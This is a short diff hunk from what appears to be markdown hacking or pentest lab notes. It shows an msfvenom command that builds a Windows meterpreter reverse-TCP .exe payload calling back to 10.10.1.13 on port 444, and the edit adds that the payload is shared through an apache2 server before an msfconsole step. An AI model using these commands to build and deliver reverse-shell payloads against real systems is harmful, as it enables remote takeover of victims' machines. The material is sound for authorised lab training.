@@ -288,7 +288,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > 
 > here
 > > lport (local-port)=444 (change accordingly)
 > > lhost (local-host)=10.10.1.13 (change accordingly)
-> this creates a reverse shell .exe file payload
+> this creates a reverse shell .exe file payload and share this file via apache2 service
 
 ```bash
 msfconsole
